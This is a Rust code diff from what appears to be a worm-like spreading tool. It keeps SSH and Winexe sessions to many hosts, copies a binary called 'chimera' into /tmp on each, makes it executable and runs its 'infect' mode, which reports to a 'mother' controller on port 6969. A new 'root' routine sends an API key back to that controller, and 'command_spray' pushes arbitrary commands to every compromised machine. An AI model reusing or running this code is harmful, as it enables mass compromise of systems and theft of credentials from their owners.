@@ -18,6 +18,7 @@ use tokio::{
     fs::File,
     io::{AsyncReadExt, AsyncWriteExt},
     net::TcpStream,
+    sync::Mutex,
     time::{timeout, Duration},
 };
 
@@ -35,6 +36,13 @@ impl SessionType {
             SessionType::SSH(session) => session.close().await,
             SessionType::Winexe(session) => session.close().await,
         };
+    }
+
+    pub fn get_ip(&self) -> &str {
+        match self {
+            SessionType::SSH(session) => session.get_ip(),
+            SessionType::Winexe(session) => session.get_ip(),
+        }
     }
 
     pub async fn execute_command(&self, command: &str) -> anyhow::Result<Option<String>> {
@@ -91,6 +99,16 @@ impl ConnectionPool {
         let results = join_all(futures).await;
 
         results.into_iter().filter_map(|result| result).collect()
+    }
+
+    pub fn remove(&mut self, ip: &str) {
+        self.clients.retain(|client| client.1.get_ip() != ip);
+    }
+
+    pub fn remove_many(&mut self, ips: Vec<String>) {
+        self.clients
+            .retain(|client| !ips.contains(&client.1.get_ip().to_string()));
+        println!("Removed {} clients", ips.len());
     }
 }
 
@@ -177,20 +195,50 @@ impl Spreader {
         }
     }
 
-    pub async fn spread(&self) {
-        let clients = Arc::new(&self.pool.clients);
+    // Starts Serial Scriper on the golden host and posts the api key to the mother
+    pub async fn root(&self, golden_ip: &str) -> anyhow::Result<Option<String>> {
+        if let Some(client) = self
+            .pool
+            .clients
+            .iter()
+            .find(|client| client.1.get_ip() == golden_ip)
+        {
+            let cmd = format!(
+                "/tmp/chimera root -m {} -p 6969 -l {}",
+                self.mother_ip,
+                self.pool.clients.len()
+            );
+            client.1.execute_command(&cmd).await
+        } else {
+            Err(anyhow!("No client with ip {} found", golden_ip))
+        }
+    }
+
+    pub async fn spread(&mut self) {
+        // Clone the necessary data before the async block
+        let mother_ip = self.mother_ip.clone();
+        let clients = self.pool.clients.clone(); // Assuming clients is `Vec<Arc<...>>`
+
         let mut futures = Vec::new();
+        let failed_clients = Arc::new(Mutex::new(Vec::new()));
 
         for client in clients.iter() {
             let shared_client = client.clone();
+            let shared_failed_clients = failed_clients.clone();
+            let local_mother_ip = mother_ip.clone(); // Clone for use in the async block
 
-            // Create a future for each client and add it to the vector
             let client_future = async move {
                 match shared_client.0 {
                     OS::Unix => {
-                        match Self::spread_unix(&self.mother_ip, &shared_client.1).await {
+                        match Self::spread_unix(&local_mother_ip, &shared_client.1).await {
                             Ok(_) => println!("Successfully spread"),
-                            Err(e) => println!("Error spreading: {}", e),
+                            Err(e) => {
+                                println!("Error spreading: {}", e);
+                                shared_failed_clients
+                                    .lock()
+                                    .await
+                                    .push(shared_client.1.get_ip().to_string());
+                            }
                         };
                     }
                     _ => {}
@@ -202,6 +250,8 @@ impl Spreader {
 
         // Await all futures concurrently
         join_all(futures).await;
+
+        self.pool.remove_many(failed_clients.lock().await.clone());
     }
 
     async fn spread_unix(mother_ip: &str, session: &SessionType) -> anyhow::Result<()> {
@@ -215,7 +265,12 @@ impl Spreader {
             .transfer_file("/tmp/chimera.tmp", "/tmp/chimera")
             .await?;
 
-        session.execute_command("chmod +x /tmp/chimera").await?;
+        match session.execute_command("chmod +x /tmp/chimera").await {
+            Ok(_) => {}
+            Err(e) => {
+                return Err(anyhow!("Error setting permissions: {}", e));
+            }
+        };
 
         let cmd = format!("/tmp/chimera infect -m {} -p 6969", mother_ip);
         session.execute_command(&cmd).await?;
@@ -224,11 +279,17 @@ impl Spreader {
     }
 
     // Executes command on all clients of a given session type (SSH or Winexe)
-    pub async fn command_spray(&self, session_type: &str, command: &str) {
+    pub async fn command_spray(
+        &self,
+        session_type: &str,
+        command: &str,
+        exclusion_list: Vec<&str>,
+    ) {
         let futures = self
             .pool
             .clients
             .iter()
+            .filter(|client| !exclusion_list.contains(&client.1.get_ip()))
             .filter(|client| match session_type {
                 "SSH" => matches!(client.1, SessionType::SSH(_)),
                 "WINEXE" => matches!(client.1, SessionType::Winexe(_)),
